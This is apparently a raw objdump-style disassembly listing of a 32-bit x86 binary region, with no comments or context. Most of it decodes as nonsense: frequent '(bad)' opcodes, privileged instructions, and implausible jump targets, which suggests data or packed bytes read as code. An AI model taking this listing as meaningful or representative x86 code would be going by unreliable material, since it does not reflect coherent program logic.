  431db5:	mov    esi,DWORD PTR [edx-0x20]
  431db8:	add    BYTE PTR [ebp-0x3d],bh
  431dbb:	xor    eax,DWORD PTR [ebp-0x73]
  431dbe:	mov    edi,DWORD PTR [esi]
  431dc0:	cld    
  431dc1:	jb     0x431d89
  431dc3:	add    bl,al
  431dc5:	jne    0x431e0c
  431dc7:	mov    edx,DWORD PTR [edi-0x10]
  431dca:	jge    0x431e49
  431dcc:	mov    esi,DWORD PTR [ebx]
  431dce:	lock add ecx,DWORD PTR [ebp+0x3b]
  431dd2:	xor    esi,DWORD PTR [ebp-0x77]
  431dd5:	mov    esi,eax
  431dd7:	lock inc ebp
  431dd9:	jge    0x431e10
  431ddb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431de2:	dec    ebp
  431de3:	mov    esi,DWORD PTR [ebx]
  431de5:	loopne 0x431d70
  431de7:	jge    0x431de1
  431de9:	add    DWORD PTR [ebp-0x7d],eax
  431dec:	cmc    
  431ded:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431df4:	dec    ebp
  431df5:	hlt    
  431df6:	xor    ebx,DWORD PTR [ebp-0x77]
  431df9:	mov    esi,esp
  431dfb:	in     al,0x45
  431dfd:	jge    0x431e38
  431dff:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431e06:	dec    ebp
  431e07:	dec    esp
  431e08:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431e0e:	inc    ebp
  431e0f:	hlt    
  431e10:	xor    eax,0xb88b9f75
  431e15:	add    al,0x95
  431e17:	icebp  
  431e18:	add    dl,dh
  431e1a:	mov    DWORD PTR [ebp+0x20],ebx
  431e1d:	cmp    eax,DWORD PTR [ebp+0xf]
  431e20:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431e24:	fistp  WORD PTR [ebx+0x0]
  431e27:	inc    ebp
  431e28:	mov    ebx,DWORD PTR [edi+0xc]
  431e2b:	add    eax,eax
  431e2d:	inc    ebp
  431e2e:	test   BYTE PTR [ebx],dh
  431e30:	add    eax,DWORD PTR [ebx]
  431e32:	add    BYTE PTR [esi+0x45],bl
  431e35:	ret    0x85
  431e38:	jnp    0x5443a207
  431e3e:	inc    bp
  431e40:	inc    ebp
  431e41:	xor    eax,0xc78a9cb9
  431e46:	add    ah,bl
  431e48:	xor    eax,DWORD PTR [ebp+0x453bf8b9]
  431e4e:	add    BYTE PTR [ebx+0x3],dl
  431e51:	mov    esi,0x708088b
  431e56:	cmp    esi,eax
  431e58:	setp   BYTE PTR [ecx-0x74fcffce]
  431e5f:	mov    esp,edi
  431e61:	call   0x33ce63b3
  431e66:	or     BYTE PTR [ebx],al
  431e68:	inc    ecx
  431e69:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  431e6f:	and    BYTE PTR [ebp-0x7074f0bb],al
  431e75:	lock add cl,al
  431e78:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  431e7f:	mov    ch,0x45
  431e81:	clc    
  431e82:	xor    eax,DWORD PTR [ebp+0x3]
  431e85:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  431e8b:	inc    ebp
  431e8c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  431e92:	mov    edi,eax
  431e94:	mov    eax,DWORD PTR [ebp+0x3c]
  431e97:	mov    ecx,DWORD PTR [eax]
  431e99:	hlt    
  431e9a:	inc    ebp
  431e9b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  431ea2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  431ea8:	push   ebp
  431ea9:	mov    edi,DWORD PTR [ebx]
  431eab:	in     al,dx
  431eac:	jne    0x431e6f
  431eae:	mov    eax,DWORD PTR [ebp-0x28]
  431eb1:	add    DWORD PTR [eax],0xe8058dec
  431eb7:	clc    
  431eb8:	mov    esi,DWORD PTR [edi-0x8]
  431ebb:	add    dh,dl
  431ebd:	rol    WORD PTR [ebp-0x1],cl
  431ec1:	mov    edx,DWORD PTR [eax+0x8]
  431ec4:	jne    0x431e86
  431ec6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  431ecd:	inc    ebp
  431ece:	push   esp
  431ecf:	test   DWORD PTR [ecx+0xf],ecx
  431ed2:	sub    edx,esp
  431ed4:	add    eax,DWORD PTR [eax]
  431ed6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  431edc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  431ee3:	mov    eax,DWORD PTR [ecx]
  431ee5:	and    BYTE PTR [eax],al
  431ee7:	cmp    dl,BYTE PTR [eax]
  431ee9:	add    BYTE PTR [ebp+0x66],al
  431eec:	inc    ecx
  431eee:	push   esp
  431eef:	add    BYTE PTR [ebp+0x0],dh
  431ef2:	push   edx
  431ef3:	enterw 0xc1,0x4d
  431ef8:	mov    esp,DWORD PTR [esi+0x20]
  431efb:	add    DWORD PTR [ecx-0x7b],eax
  431efe:	add    eax,DWORD PTR [ebx]
  431f00:	str    WORD PTR [eax+0x45]
  431f04:	lea    ecx,[ebx+0x45890801]
  431f0a:	sbb    BYTE PTR [ebx],al
  431f0c:	dec    ebp
  431f0d:	cmp    al,0xf
  431f0f:	inc    ebp
  431f10:	push   eax
  431f11:	mov    esi,DWORD PTR [ebx]
  431f13:	push   eax
  431f14:	add    eax,eax
  431f16:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  431f1d:	inc    ebp
  431f1e:	add    BYTE PTR ds:0x8b4d8c00,dh
  431f24:	xor    edx,esp
  431f26:	add    eax,esi
  431f28:	mov    ebx,eax
  431f2a:	loopne 0x431f71
  431f2c:	dec    ebp
  431f2d:	mov    ecx,DWORD PTR [edi]
  431f2f:	cld    
  431f30:	push   eax
  431f31:	xchg   DWORD PTR [ebx],esi
  431f33:	add    DWORD PTR [ebx],ebp
  431f35:	add    BYTE PTR [ebx],ch
  431f37:	or     BYTE PTR [ecx],bh
  431f39:	dec    ecx
  431f3a:	loopne 0x431f3f
  431f3c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  431f42:	push   ebp
  431f43:	add    DWORD PTR [ebx+0x55100800],eax
  431f49:	dec    ebp
  431f4a:	jmp    0x431ed5
  431f4c:	mov    esp,DWORD PTR [eax]
  431f4e:	sbb    dl,dl
  431f50:	inc    eax
  431f51:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  431f57:	add    BYTE PTR [ebx+0x74528555],cl
  431f5d:	push   ebp
  431f5e:	div    DWORD PTR [ebx]
  431f60:	and    eax,DWORD PTR [ebx]
  431f62:	add    edx,DWORD PTR [edx-0x30]
  431f65:	jno    0x431ef2
  431f67:	inc    DWORD PTR [eax+eiz*1]
  431f6a:	inc    ebp
  431f6b:	push   eax
  431f6c:	push   eax
  431f6d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  431f73:	mov    edi,esp
  431f75:	push   eax
  431f76:	inc    ebp
  431f77:	enter  0x458b,0x8
  431f7b:	push   ecx
  431f7c:	(bad)  
  431f7d:	call   0x10d2955
  431f82:	pop    ss
  431f83:	push   ebp
  431f84:	mov    ecx,DWORD PTR [ebx+0x489408]
  431f8a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  431f90:	push   ecx
  431f91:	jo     0x431f7b
  431f93:	inc    DWORD PTR [edi]
  431f95:	or     BYTE PTR [eax],al
  431f97:	call   0xce26e1
  431f9c:	fmul   QWORD PTR [ebp+0x55]
  431f9f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  431fa5:	mov    bh,0x8c
  431fa7:	adc    al,0x9a
  431fa9:	dec    esp
  431faa:	xor    bl,BYTE PTR [eax]
  431fac:	mov    ecx,DWORD PTR [ebp+0xc]
  431faf:	mov    eax,DWORD PTR [ebp-0x4]
  431fb2:	mov    esi,DWORD PTR [edi-0x3148f924]
  431fb8:	push   es
  431fb9:	retf   
  431fba:	mov    BYTE PTR [ebp-0x30],0x3b
  431fbe:	inc    ebp
  431fbf:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  431fc6:	retf   0x83fc
  431fc9:	into   
  431fca:	dec    ebp
  431fcb:	retf   
  431fcc:	mov    ecx,DWORD PTR [ebp-0x74]
  431fcf:	mov    eax,DWORD PTR [eax]
  431fd1:	fdiv   QWORD PTR [ebx]
  431fd3:	mov    bh,0x3
  431fd5:	push   es
  431fd6:	mov    esi,ecx
  431fd8:	sbb    cl,dl
  431fda:	dec    ebp
  431fdb:	sar    DWORD PTR [ebx],cl
  431fdd:	push   ebp
  431fde:	jne    0x431fef
  431fe0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  431fe6:	lea    ebx,[eax]
  431fe8:	call   0xf4ccabaf
  431fed:	sbb    dh,dl
  431fef:	add    edx,ebx
  431ff1:	push   ebp
  431ff2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  431ff8:	push   ecx
  431ff9:	mov    DWORD PTR [eax-0x30],edx
  431ffc:	test   DWORD PTR [edx],eax
  431ffe:	xadd   esp,esi
  432001:	pop    es
  432002:	add    cl,dl
  432004:	mov    eax,ecx
  432006:	or     al,0x45
  432008:	(bad)  
  432009:	push   eax
  43200a:	add    DWORD PTR [edx+0x0],eax
  43200d:	add    ecx,DWORD PTR [ecx]
  43200f:	and    dh,cl
  432011:	call   0xc728e1
  432016:	add    DWORD PTR [ebp+0x0],edx
  432019:	mov    esp,DWORD PTR [ebp+0x18]
  43201c:	add    BYTE PTR [eax+0x54],cl
  43201f:	xor    eax,DWORD PTR [eax]
  432021:	add    esp,DWORD PTR [esi+0x3b]
  432024:	inc    ebp
  432025:	je     0x431faa
  432027:	push   ecx
  432028:	cli    
  432029:	dec    ebp
  43202a:	mov    DWORD PTR [ebx],eax
  43202c:	(bad)  
  43202d:	or     al,0x5e
  43202f:	inc    eax
  432030:	add    BYTE PTR [ebx],al
  432032:	data16 and BYTE PTR [ebp+0x50],al
  432036:	sub    DWORD PTR [ecx],0xfffffff8
  432039:	add    BYTE PTR [ebp-0x75],ah
  43203c:	add    BYTE PTR [eax],bl
  43203e:	enter  0x894d,0x8b
  432042:	int3   
  432043:	loopne 0x43207f
  432045:	rol    BYTE PTR [eax],0x33
  432048:	lea    cx,[ebp+0xa]
  43204c:	data16 jb 0x432094
  43204f:	add    BYTE PTR [ebx+0x44890855],cl
  432055:	sbb    ah,al
  432057:	inc    ebp
  432058:	cmp    cl,BYTE PTR [edi]
  43205a:	add    BYTE PTR [edx+0x66],dl
  43205d:	xor    ecx,DWORD PTR [eax]
  43205f:	sub    eax,DWORD PTR [eax]
  432061:	mov    eax,DWORD PTR [eax]
  432063:	or     al,0x66
  432065:	ror    edx,cl
  432067:	dec    ebp
  432068:	inc    ebp
  432069:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43206f:	cld    
  432070:	or     BYTE PTR [edi+0x4501dd],dl
  432076:	ror    dh,0xee
  432079:	retf   
  43207a:	(bad)  
  43207b:	dec    ebp
  43207c:	mov    al,0x8b
  43207e:	loop   0x4320a0
  432080:	cmp    ecx,DWORD PTR [edx]
  432082:	inc    ebp
  432083:	daa    
  432084:	loop   0x43200d
  432086:	out    dx,al
  432087:	add    edi,eax
  432089:	add    BYTE PTR [eax+0x3f52ed55],bh
  43208f:	push   ebp
  432090:	inc    ebp
  432091:	xor    ebx,eax
  432093:	add    ebp,esi
  432095:	push   edx
  432096:	push   bp
  432098:	inc    ebp
  432099:	(bad)  
  43209a:	jmp    0xc342e6f3
  43209f:	sbb    al,0x33
  4320a1:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4320a8:	add    BYTE PTR [ebp+0x45],0x8b
  4320ac:	jmp    0xf98b:0x100041c8
  4320b3:	xor    esi,DWORD PTR [edx+0x3]
  4320b6:	mov    ecx,DWORD PTR [edi]
  4320b8:	fmul   DWORD PTR [edx]
  4320ba:	add    BYTE PTR [eax],al
  4320bc:	lea    eax,[ebx-0x4700273c]
  4320c2:	add    al,0x4f
  4320c4:	pop    DWORD PTR [eax]
  4320c6:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  4320cc:	push   edx
  4320cd:	inc    WORD PTR [ebp+0x8]
  4320d1:	mov    eax,0x514f4d
  4320d6:	(bad)
  4320da:	add    al,al
  4320dc:	xor    DWORD PTR [ebx-0x74baf730],eax
  4320e2:	test   DWORD PTR [esi+0x74],esp
  4320e5:	inc    ebp
  4320e6:	mov    DWORD PTR [eax+0xa4f08],edi
  4320ec:	add    BYTE PTR [ecx-0x76c435bb],cl
  4320f2:	or     dh,cl
  4320f4:	or     eax,0x8b8d5045
  4320f9:	inc    ebp
  4320fa:	mov    WORD PTR [ecx+0x3b8a00],?
  432100:	jne    0x432135
  432102:	mov    edi,DWORD PTR [edx+0x8f3b18]
  432108:	add    DWORD PTR [ebx],eax
  43210a:	add    bh,bh
  43210c:	adc    DWORD PTR [eax],ecx
  43210e:	adc    DWORD PTR [ebp+0x55],edi
  432111:	push   es
  432112:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  432118:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11d8]
  43211f:	inc    ebp
  432120:	mov    esp,edi
  432122:	or     al,0xd8
  432124:	push   eax
  432125:	(bad)  
  432126:	jne    0x4320dc
  432128:	call   0x3b1a15
  43212d:	inc    ebp
  43212e:	sar    BYTE PTR [edx],0x84
  432131:	out    dx,al
  432132:	add    bh,al
  432134:	add    BYTE PTR [ebp+esi*2-0x247428],bh
  43213b:	(bad)  
  43213c:	and    al,al
  43213e:	fs jmp 0x7cc86743
  432144:	bswap  ecx
  432146:	scas   al,BYTE PTR es:[edi]
  432147:	inc    esp
  432148:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43214f:	or     BYTE PTR [ebx-0x97717c7],0x83
  432156:	call   DWORD PTR [edi]
  432158:	shr    ah,0x84
  43215b:	xchg   DWORD PTR [eax],eax
  43215d:	add    DWORD PTR [eax],eax
  43215f:	add    bh,bh
  432161:	dec    ebp
  432162:	and    BYTE PTR [ecx-0x38],dl
  432165:	push   eax
  432166:	dec    DWORD PTR [ebx+0xfd885]
  43216c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432172:	mov    WORD PTR [ecx+0x0],ss
  432175:	lea    ecx,[ebx+0x108b20d8]
  43217b:	mov    WORD PTR [edx],ds
  43217d:	add    BYTE PTR [edi+0xff01ff],al
  432183:	mov    ecx,DWORD PTR [ebp-0x28]
  432186:	push   ecx
  432187:	shl    BYTE PTR [ebp+0x3a],0x8b
  43218b:	inc    ebp
  43218c:	in     al,0xeb
  43218e:	jno    0x43211b
  432190:	push   edx
  432191:	mov    DWORD PTR [eax-0x28],edx
  432194:	mov    eax,DWORD PTR [ebp+0x20]
  432197:	je     0x432120
  432199:	mov    eax,DWORD PTR [ecx]
  43219b:	sbb    BYTE PTR [eax],al
  43219d:	pop    DWORD PTR [eax]
  43219f:	add    esi,eax
  4321a1:	add    bl,al
  4321a3:	adc    DWORD PTR [edi],esi
  4321a5:	jmp    0x8bce71f7
  4321aa:	sub    BYTE PTR [ebp+eax*2-0x63c4cb00],cl
  4321b1:	jne    0x43213e
  4321b3:	mov    ecx,DWORD PTR [eax]
  4321b5:	in     al,0x75
  4321b7:	pop    DWORD PTR [ecx+0x5301]
  4321bd:	push   edx
  4321be:	inc    DWORD PTR [ebx]
  4321c0:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4321c6:	add    BYTE PTR [edi+0x9],dl
  4321c9:	call   DWORD PTR [esi]
  4321cb:	and    dl,al
  4321cd:	and    bh,bh
  4321cf:	inc    edi
  4321d1:	test   eax,edx
  4321d3:	sldt   ebx
  4321d6:	xor    al,0x0
  4321d8:	pushf  
  4321d9:	(bad)  
  4321da:	jmp    0x4321e8
  4321dc:	mov    eax,edi
  4321de:	or     al,0x75
  4321e0:	inc    eax
  4321e1:	call   0x4318e9
  4321e6:	mov    eax,eax
  4321e8:	loopne 0x43216e
  4321ea:	inc    ebp
  4321eb:	add    BYTE PTR [ebx+0x1451c00],cl
  4321f1:	mov    eax,DWORD PTR [ebp+0x20]
  4321f4:	add    edi,ecx
  4321f6:	add    BYTE PTR [eax],ch
  4321f8:	cmp    edi,0x18
  4321fb:	test   DWORD PTR [ebp+0xf],esi
  4321fe:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  432205:	jne    0x432209
  432207:	call   0xffa21ccc
  43220c:	leave  
  43220d:	rcr    BYTE PTR [esp+eax*4],0x55
  432211:	add    ah,ch
  432213:	add    BYTE PTR [edi-0x48fef979],dh
  432219:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  432220:	inc    esp
  432221:	mov    ebx,DWORD PTR [eax]
  432223:	fcom   st(2)
  432225:	add    BYTE PTR [edi],bl
  432227:	lea    ecx,[eax-0x18]
  43222a:	(bad)  
  43222b:	push   DWORD PTR [ecx]
  43222d:	call   0xffb56f8f
  432232:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432236:	fstp   DWORD PTR [esi+ebx*8]
  432239:	push   ebp
  43223a:	pop    ebp
  43223b:	mov    esi,DWORD PTR [edx-0x38]
  43223e:	add    DWORD PTR [eax],0x28
  432241:	mov    edi,DWORD PTR [ebx]
  432243:	xor    esi,DWORD PTR [edx+0x3]
  432246:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43224a:	pop    ebp
  43224b:	or     al,0x4
  43224d:	inc    ecx
  43224e:	push   ebp
  43224f:	(bad)  
  432250:	in     al,dx
  432251:	or     ah,ch
  432253:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432254:	xbegin 0xffc8984a
  43225a:	clc    
  43225b:	adc    al,0x45
  43225d:	div    BYTE PTR [eax+ecx*1]
  432260:	pushf  
  432261:	add    bh,al
  432263:	jne    0x43223d
  432265:	add    DWORD PTR [ebp+0x5b00f89a],0x66710066
  43226f:	add    eax,DWORD PTR [ebp+0x52]
  432272:	adc    eax,0x20
  432275:	xchg   DWORD PTR [ecx+0x4000fc01],ecx
  43227b:	test   DWORD PTR [eax],eax
  43227d:	clc    
  43227e:	data16 or al,BYTE PTR [ebp+0x45]
  432282:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432289:	rol    BYTE PTR [ebp+0x45],1
  43228c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432292:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432298:	push   ebx
  432299:	add    BYTE PTR [ebx+0x0],dl
  43229c:	push   ecx
  43229d:	jge    0x4322d2
  43229f:	add    BYTE PTR [esi+0x4],dl
  4322a2:	jne    0x432309
  4322a4:	mov    edx,0x457200
  4322a9:	jmp    0x43226d
  4322ab:	xor    edi,DWORD PTR [ebx]
  4322ad:	pop    edi
  4322ae:	cvtdq2ps xmm7,xmm0
  4322b1:	ret    0x0
  4322b4:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4322ba:	xor    ecx,DWORD PTR [edi]
  4322bc:	add    eax,DWORD PTR [ecx+0x3b]
  4322bf:	push   ebx
  4322c0:	rdpmc  
  4322c2:	out    0x8d,al
  4322c4:	add    BYTE PTR [eax],cl
  4322c6:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  4322cc:	ret    0x450c
  4322cf:	sbb    al,0x8b
  4322d1:	cmp    eax,esi
  4322d3:	or     cl,al
  4322d5:	or     al,0xc2
  4322d7:	pop    eax
  4322d8:	inc    ebp
  4322d9:	add    ecx,DWORD PTR [edi]
  4322db:	add    esi,DWORD PTR [ebp+0x39]
  4322de:	invd   
  4322e0:	jge    0x4322ec
  4322e2:	mov    eax,0x478ac0
  4322e7:	cli    
  4322e8:	xor    esp,ecx
  4322ea:	mov    ebx,0x5b8ac0
  4322ef:	ret    0x33
  4322f2:	mov    eax,0x833b8b
  4322f7:	sub    BYTE PTR [ebx],al
  4322f9:	inc    ebp
  4322fa:	xor    ax,0x9cf8
  4322fe:	inc    bh
  432300:	mov    esp,esp
  432302:	hlt    
  432303:	test   DWORD PTR [ebp-0x8],esi
  432306:	mov    eax,DWORD PTR [ebp-0x14]
  432309:	cmp    ecx,DWORD PTR [ebx-0x76478864]
  43230f:	dec    edi
  432310:	or     BYTE PTR [eax],al
  432312:	jne    0x43229d
  432314:	mov    esi,esp
  432316:	call   0x77a9aedb
  43231b:	inc    ebp
  43231c:	mov    DWORD PTR [eax+0x9a4f0c],edi
  432322:	add    BYTE PTR [ecx-0x3ffe0717],cl
  432328:	add    BYTE PTR [esi+0x7d],ah
  43232b:	inc    ebp
  43232c:	mov    bx,WORD PTR [ebp+0x8]
  432330:	add    DWORD PTR [ebp+0x53],0x30c008b
  432337:	inc    ebp
  432338:	mov    bx,di
  43233b:	lock test BYTE PTR [ecx+0x7000801],bh
  432342:	jge    0x432305
  432344:	mov    ecx,DWORD PTR [ebx-0x650613f0]
  43234a:	cli    
  43234b:	xor    bl,bh
  43234d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432353:	test   BYTE PTR [eax],cl
  432355:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43235c:	cmp    ebp,eax
  43235e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432365:	test   BYTE PTR [ebp+0x1],bh
  432368:	mov    ebx,0x458a00
  43236d:	xor    esi,DWORD PTR [ebx]
  43236f:	add    esp,DWORD PTR [esi-0x77]
  432372:	pop    ebp
  432373:	loopne 0x4323db
  432375:	inc    ebp
  432376:	clc    
  432377:	xor    edi,DWORD PTR [ebx]
  432379:	add    esi,DWORD PTR [edx-0x77]
  43237c:	data16 fdivr QWORD PTR [ebp-0x49]
  432380:	mov    ebx,0xb78afc
  432385:	hlt    
  432386:	xor    edi,DWORD PTR [edx]
  432388:	data16 add BYTE PTR [ebp+0x66],bl
  43238c:	data16 lock clc 
  43238f:	cmp    bh,BYTE PTR [ebx]
  432391:	add    BYTE PTR [edi+0x66],dh
  432394:	psubq  mm7,QWORD PTR [ebp+0x0]
  432398:	ltr    WORD PTR [ebp+0x66]
  43239c:	add    esi,eax
  43239e:	add    di,WORD PTR [ebp+0x2b]
  4323a2:	data16 data16 jge 0x432423
  4323a6:	mov    ebx,0xe08a8b
  4323ab:	jge    0x4323e0
  4323ad:	data16 data16 xor al,0x5d
  4323b1:	data16 data16 jne 0x4323ad
  4323b5:	mov    edi,DWORD PTR [ebx]
  4323b7:	fdiv   QWORD PTR [edx+0x7d]
  4323ba:	data16 data16 jge 0x4323f2
  4323be:	mov    ebx,0x758a66
  4323c3:	mov    esi,0x667233
  4323c8:	pop    ebp
  4323c9:	or     BYTE PTR [esi+0x0],ah
  4323cc:	clc    
  4323cd:	mov    edi,DWORD PTR [ebx]
  4323cf:	lock ja 0x43235d
  4323d2:	(bad)  
  4323d4:	jge    0x4323cd
  4323d6:	invd   
  4323d8:	pop    ebp
  4323d9:	add    BYTE PTR [ebx],al
  4323db:	(bad)  
  4323dc:	cmp    di,WORD PTR [ebp+0xf]
  4323e0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4323e4:	mov    bx,WORD PTR [ebp-0x10]
  4323e8:	pop    bp
  4323ea:	fbstp  TBYTE PTR [ebx]
  4323ec:	test   DWORD PTR [ebx],eax
  4323ee:	add    BYTE PTR [ebx],bh
  4323f0:	add    BYTE PTR [esi+0x7d],ah
  4323f3:	jge    0x432380
  4323f5:	data16 in al,dx
  4323f7:	pop    ebp
  4323f8:	stc    
  4323f9:	bsf    ecx,DWORD PTR [ebp+0x6632009a]
  432400:	mov    edi,ebx
  432402:	in     al,dx
  432403:	test   BYTE PTR [ebp+0x0],bh
  432406:	mov    eax,DWORD PTR [eax]
  432408:	call   0xbd401d98
  43240d:	cmp    bl,BYTE PTR [edx-0x7699ce00]
  432413:	sti    
  432414:	call   0x8b4ba1a4
  432419:	add    ebp,esp
  43241b:	mov    bx,di
  43241e:	jnp    0x432446
  432420:	mov    DWORD PTR [ebx+0x3a7df808],ecx
  432426:	mov    eax,DWORD PTR [eax]
  432428:	call   0x7c3eaf93
  43242d:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432433:	data16 data16 fistp WORD PTR [ebp+0xe]
  432438:	xor    DWORD PTR [edi-0x48fff7ad],0xfb66f403
  432442:	fisttp WORD PTR [ecx-0x7401f77b]
  432448:	(bad)  
  432449:	cld    
  43244a:	jne    0x432486
  43244c:	xor    eax,DWORD PTR [eax]
  43244e:	mov    esp,DWORD PTR [esi-0x10]
  432451:	sti    
  432452:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432459:	data16 adc bl,bh
  43245c:	push   ebp
  43245d:	xor    ecx,DWORD PTR es:[ebx+0x3ae4f88b]
  432464:	mov    WORD PTR [eax],es
  432466:	call   0xe48b:0x89fb3266
  43246d:	or     al,0x55
  43246f:	add    ecx,DWORD PTR [ebx-0x7420139a]
  432475:	push   cs
  432476:	push   esi
  432477:	mov    bh,0xc8
  432479:	or     al,0x2b
  43247b:	mov    bh,0xba
  43247d:	hlt    
  43247e:	mov    bh,bl
  432480:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432486:	dec    edi
  432487:	or     al,0x0
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	or     BYTE PTR [ebp+0x3b],dh
  43248e:	mov    ecx,DWORD PTR [edi]
  432490:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432496:	xor    al,0xd8
  432498:	pop    bp
  43249a:	lock xor esi,DWORD PTR [ebx]
  43249d:	lea    esp,[esi+0x1f]
  4324a0:	icebp  
  4324a1:	jb     0x4324a7
  4324a3:	add    al,al
  4324a5:	jge    0x4324b3
  4324a7:	mov    eax,eax
  4324a9:	fsubr  st,st(3)
  4324ab:	pop    ebp
  4324ac:	mov    esi,DWORD PTR [ebx]
  4324ae:	in     al,0x8d
  4324b0:	rcr    DWORD PTR [edi],0xc2
  4324b3:	jb     0x432513
  4324b5:	add    cl,cl
  4324b7:	jge    0x4324c5
  4324b9:	mov    edx,DWORD PTR [ebp-0x20]
  4324bc:	in     al,dx
  4324bd:	pop    ebp
  4324be:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4324c3:	cmp    di,WORD PTR [ebp+0x0]
  4324c7:	mov    ebp,DWORD PTR [ebx]
  4324c9:	fdivr  QWORD PTR [esi+0x668a5d]
  4324cf:	cmp    al,0x33
  4324d1:	mov    si,0x4f7d
  4324d5:	mov    eax,DWORD PTR [eax]
  4324d7:	lock inc ebp
  4324d9:	mov    esi,DWORD PTR [esi]
  4324db:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4324e2:	clc    
  4324e3:	(bad)  
  4324e4:	cmp    edi,DWORD PTR [ebx]
  4324e6:	je     0x4324f7
  4324e8:	push   ebx
  4324e9:	loopne 0x4324fa
  4324eb:	dec    ecx
  4324ed:	mov    esp,DWORD PTR [esi-0x1c]
  4324f0:	int    0xf1
  4324f2:	mov    esi,0x703084d
  4324f7:	pcmpgtd mm6,mm1
  4324fa:	add    BYTE PTR [ebp+0x66],dh
  4324fd:	jmp    0x4324ca
  4324ff:	mov    eax,DWORD PTR [ebx]
  432501:	lock push ebp
  432503:	ror    DWORD PTR [ebp-0x2972feb3],1
  432509:	or     bh,dl
  43250b:	jb     0x43250b
  43250d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432513:	loopne 0x432515
  432515:	jne    0x432517
  432517:	data16 add BYTE PTR [esi+eiz*2],dh
  43251b:	mov    ecx,ebx
  43251d:	data16 cmp dh,cl
  432520:	add    BYTE PTR [edx],bh
  432522:	data16 add bl,cl
  432525:	data16 cmp dh,dl
  432528:	add    BYTE PTR [edx],bh
  43252a:	data16 add bl,cl
  43252d:	enterw 0x4df1,0x19
  432532:	pop    edi
  432533:	jne    0x4324b6
  432535:	mov    esi,DWORD PTR [esi]
  432537:	call   0x77b7b0d8
  43253c:	xor    ebp,DWORD PTR [ebx]
  43253e:	lea    esp,[esi+0x48]
  432541:	repnz in eax,0x3b
  432544:	add    BYTE PTR [ebp-0x37],dh
  432547:	xor    edx,DWORD PTR [ebp-0x15]
  43254a:	in     al,dx
  43254b:	xor    edx,DWORD PTR [esi+0x40]
  43254e:	mov    DWORD PTR [edi],0x338545fc
  432554:	clc    
  432555:	add    esi,DWORD PTR ds:0xe85b9c5f
  43255b:	ret    0xff
  43255e:	dec    DWORD PTR [ebx-0x74f8ae08]
  432564:	cmp    DWORD PTR [esi+0x45],edx
  432567:	add    BYTE PTR [eax+eax*1+0x61],bh
  43256b:	data16 (bad) 
  43256d:	into   
  43256e:	data16 cmp cl,ch
  432571:	add    BYTE PTR [ecx+0x7ce0866],bh
  432577:	cmp    ah,BYTE PTR [esi+0x0]
  43257a:	add    bh,al
  43257c:	add    ah,bh
  43257e:	add    BYTE PTR [ebp+0x35c3f866],al
  432584:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43258b:	pop    ebp
  43258c:	adc    al,0x57
  43258e:	add    BYTE PTR [edi-0x723c409a],dh
  432594:	add    edi,edi
  432596:	jne    0x4325eb
  432598:	lea    edx,[ecx+0x1]
  43259b:	mov    ebx,0xd64ff1
  4325a0:	sar    DWORD PTR [ebx],1
  4325a2:	test   BYTE PTR [ebp+0x34],dh
  4325a5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4325a9:	push   edi
  4325aa:	xor    BYTE PTR [ebx],0x39
  4325ad:	mov    esi,ebx
  4325af:	xor    eax,DWORD PTR [eax-0x3c73839a]
  4325b5:	xor    al,0x45
  4325b7:	fs pop ebx
  4325b9:	mov    ebx,0x9c3b36
  4325be:	je     0x4325eb
  4325c0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4325c6:	mov    WORD PTR [ebx],?
  4325c8:	xor    al,0xbb
  4325ca:	fs dec edi
  4325cc:	mov    eax,DWORD PTR [eax]
